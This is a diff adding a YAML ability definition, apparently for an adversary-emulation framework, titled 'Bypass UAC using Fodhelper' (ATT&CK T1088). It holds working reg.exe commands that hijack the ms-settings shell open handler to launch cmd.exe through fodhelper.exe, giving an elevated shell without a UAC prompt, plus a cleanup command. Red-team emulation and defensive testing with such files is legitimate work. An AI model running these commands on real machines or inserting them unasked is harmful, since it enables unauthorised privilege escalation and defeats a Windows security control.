@@ -1,0 +1,18 @@
+---
+
+- id: tacmulti-1088-AR02-1v00-200120190846
+  name: Bypass UAC using Fodhelper
+  description: .      Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10..  
+  tactic: multiple
+  technique:
+    attack_id: T1088
+    name: Bypass User Account Control
+  platforms:
+    windows:
+      cmd:
+        command: |
+          reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
+          reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
+          fodhelper.exe
+        cleanup: |
+          reg.exe delete hkcu\software\classes\ms-settings /f
